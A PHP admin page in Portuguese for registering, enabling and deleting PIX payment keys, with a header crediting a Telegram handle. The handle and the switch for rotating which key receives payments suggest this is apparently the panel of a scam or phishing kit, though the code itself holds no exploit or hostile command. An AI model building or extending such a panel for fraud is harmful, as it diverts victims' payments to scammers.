<?php
   session_start();
   require_once('config.php');
   
   if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
       header("Location: ./");
       exit;
   }
   
   if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['CadastraProdutos']) && $_POST['CadastraProdutos']) {
       if (!empty($_POST['tipo_chave_pix']) && !empty($_POST['chave']) && !empty($_POST['nome'])) {
           $tipo  = strtoupper($_POST['tipo_chave_pix']);
           $chave = trim($_POST['chave']);
           $nome  = trim($_POST['nome']);
   
           $stmt = $conn->prepare("INSERT INTO pix (tipo, chave, Identificacao, usar) VALUES (?, ?, ?, 1)");
           $stmt->bind_param("sss", $tipo, $chave, $nome);
   
           if ($stmt->execute()) {
               echo '
               <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
               <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
               <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
               <script>
                   $(function(){
                       toastr.options.timeOut = 2000;
                       toastr.options.closeButton = true;
                       toastr.success("Pix cadastrado com sucesso!");
                       setTimeout(() => {
                           window.location.href = "?COMON=/ADMIN&acesso=Chavespix";
                       }, 2000);
                   });
               </script>';
           } else {
               echo "Erro ao cadastrar PIX: " . $stmt->error;
           }
           $stmt->close();
       } else {
           echo "Preencha todos os campos obrigatórios.";
       }
   }
   
   if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['id']) && isset($_POST['usar']) && isset($_POST['acao']) && $_POST['acao'] === 'alterar') {
       $id = (int)$_POST['id'];
       $usar = $_POST['usar'] === '1' ? 1 : 0;
       if ($conn->query("UPDATE pix SET usar = $usar WHERE id = $id")) {
           $mensagem = $usar ? "Pix ativada com sucesso!" : "Pix desativada com sucesso!";
           echo '
           <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet" />
           <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
           <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
           <script>
               $(function() {
                   toastr.options.timeOut = 2000;
                   toastr.options.closeButton = true;
                   toastr.options.positionClass = "toast-top-right";
                   toastr.success("' . $mensagem . '");
                   setTimeout(function() {
                       window.location.href = "?COMON=/ADMIN&acesso=ChavesPix";
                   }, 2000);
               });
           </script>';
       } else {
           echo '
           <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet" />
           <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
           <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
           <script>
               $(function() {
                   toastr.options.timeOut = 2000;
                   toastr.options.closeButton = true;
                   toastr.options.positionClass = "toast-top-right";
                   toastr.error("Erro ao atualizar Pix!");
               });
           </script>';
       }
   }
   
   
   
   if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['deletar_id'])) {
       $id = (int)$_POST['deletar_id'];
       if (isset($_POST['acao']) && $_POST['acao'] === 'deletar') {
           if ($conn->query("DELETE FROM pix WHERE id = $id")) {
               echo '
               <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet" />
               <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
               <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
               <script>
                   $(function() {
                       toastr.options.timeOut = false;
                       toastr.options.closeButton = true;
                       toastr.options.positionClass = "toast-top-right";
                       toastr.success("PIX removido com sucesso!");
                       setTimeout(function() {
                           window.location.href = "?COMON=/ADMIN&acesso=ChavesPix";
                       }, 2000);
                   });
               </script>';
           }
       }
   }
   
   $query = $conn->query("SELECT COUNT(*) AS total FROM pix");
   $listapix = $query->fetch_assoc()['total'] ?? 0;
   
   $Recordset1 = $conn->query("SELECT * FROM pix ORDER BY id DESC");
   $totalRows_Recordset1 = $Recordset1->num_rows;
   ?>
<!doctype html>
<html lang="pt-br" data-theme="dark">
   <?php include('head.php'); ?>
   <body data-theme="light">
      <div id="body" class="theme-cyan">
      <?php include('theme.php'); ?>
      <div class="overlay"></div>
      <div id="wrapper">
      <?php include('submenu.php'); ?>
      <?php include('menu.php'); ?>
      <div id="main-content">
      <div class="container-fluid">
         <div class="block-header">
            <div class="col-lg-4 col-md-12 col-sm-12">
               <h1>Olá admin, você está em / ChavesPix</h1>
               <span>TXT_JPGI1 - @TXT_JPGI1 <== no telegram!</span>
            </div>
         </div>
      </div>
      <div class="row clearfix">
         <div class="card">
            <div class="card-header">
               <strong>Cadastrar Chaves Pix</strong>
            </div>
            <div class="card-body card-block">
               <form action="" method="post" name="formu" class="form-horizontal">
                  <div class="row form-group">
                     <div class="col-md-3"><label>Tipo Chave Pix</label></div>
                     <div class="col-md-9">
                        <select name="tipo_chave_pix" id="tipo_chave_pix" class="form-control" required>
                           <option value="" disabled selected>Escolher Tipo</option>
                           <option value="CPF">CPF</option>
                           <option value="CNPJ">CNPJ</option>
                           <option value="TELEFONE">Telefone</option>
                           <option value="EMAIL">E-mail</option>
                           <option value="ALEATORIA">Chave Aleatória</option>
                        </select>
                     </div>
                  </div>
                  <div class="row form-group">
                     <div class="col-md-3"><label>Chave</label></div>
                     <div class="col-md-9">
                        <input type="text" class="form-control" id="chave_pix" name="chave" required>
                     </div>
                  </div>
                  <div class="row form-group">
                     <div class="col-md-3"><label>Identificação</label></div>
                     <div class="col-md-9">
                        <input type="text" class="form-control" name="nome" placeholder="ex 'Lucas'" required>
                     </div>
                  </div>
                  <input type="hidden" name="CadastraProdutos" value="1">
                  <div class="card-footer">
                     <button type="submit" class="btn btn-primary btn-sm">Cadastrar Chave</button>
                  </div>
               </form>
            </div>
         </div>
      </div>
      <div class="card">
         <div class="card-header d-flex justify-content-between align-items-center">
            <strong class="card-title">Chaves Cadastradas</strong>
         </div>
         <div class="card-body">
            <div class="table-responsive">
               <table class="table mb-0">
                  <thead>
                     <tr>
                        <!--<th>ID</th>-->
                        <th>Tipo</th>
                        <th>Chave</th>
                        <th>Identificação</th>
                        <th>Usar</th>
                        <th>Ações</th>
                     </tr>
                  </thead>
                  <tbody>
                     <?php if ($totalRows_Recordset1 == 0): ?>
                     <tr>
                        <td colspan="6" class="text-center">
                           Nenhuma chave PIX cadastrada.
                        </td>
                     </tr>
                     <?php else: ?>
                     <?php while ($row = $Recordset1->fetch_assoc()): ?>
                     <tr>
                        <!--<td></td>-->
                        <td><?= htmlspecialchars($row['tipo']) ?></td>
                        <td><?= htmlspecialchars($row['chave']) ?></td>
                        <td><?= htmlspecialchars($row['Identificacao']) ?></td>
                        <td>
                           <form method="post" class="mb-0">
                              <input type="hidden" name="id" value="<?= (int)$row['id'] ?>">
                              <input type="hidden" name="acao" value="alterar">
                              <select name="usar"
                                 class="form-control form-control-sm"
                                 onchange="this.form.submit()">
                                 <option value="1" <?= $row['usar'] == 1 ? 'selected' : '' ?>>Sim</option>
                                 <option value="0" <?= $row['usar'] == 0 ? 'selected' : '' ?>>Não</option>
                              </select>
                           </form>
                        </td>
                        <td>
                           <form method="post" class="d-inline">
                              <input type="hidden" name="deletar_id" value="<?= (int)$row['id'] ?>">
                              <input type="hidden" name="acao" value="deletar">
                              <button type="submit" class="btn btn-danger btn-sm">
                              Deletar
                              </button>
                           </form>
                        </td>
                     </tr>
                     <?php endwhile; ?>
                     <?php endif; ?>
                  </tbody>
               </table>
            </div>
         </div>
      </div>
      <script>const tipo=document.getElementById('tipo_chave_pix'),chaveInput=document.getElementById('chave_pix');document.querySelectorAll('.row.form-group').forEach(el=>{if(el.querySelector('#chave_pix')||el.querySelector('input[name="nome"]'))el.style.display='none'});tipo.addEventListener('change',()=>{document.querySelectorAll('.row.form-group').forEach(el=>{if(el.querySelector('#chave_pix')||el.querySelector('input[name="nome"]'))el.style.display='flex'});chaveInput.value='';chaveInput.removeAttribute('maxlength');chaveInput.placeholder='';chaveInput.oninput=null;switch(tipo.value){case'CPF':chaveInput.placeholder='000.000.000-00';chaveInput.maxLength=14;chaveInput.oninput=function(){this.value=this.value.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2').substr(0,14)};break;case'CNPJ':chaveInput.placeholder='00.000.000/0000-00';chaveInput.maxLength=18;chaveInput.oninput=function(){this.value=this.value.replace(/\D/g,'').replace(/(\d{2})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1/$2').replace(/(\d{4})(\d{1,2})$/,'$1-$2').substr(0,18)};break;case'TELEFONE':chaveInput.placeholder='(00)00000-0000';chaveInput.maxLength=14;chaveInput.oninput=function(){let v=this.value.replace(/\D/g,'');v=v.length<=10?v.replace(/^(\d{2})(\d)/,'($1)$2').replace(/(\d{4})(\d)/,'$1-$2'):v.replace(/^(\d{2})(\d)/,'($1)$2').replace(/(\d{5})(\d)/,'$1-$2');this.value=v.substr(0,14)};break;case'EMAIL':chaveInput.placeholder='email@email.com';break;case'ALEATORIA':chaveInput.placeholder='Chave aleatória (ex: 123e4567-e89b-12d3-a456-426614174000)';break}});</script>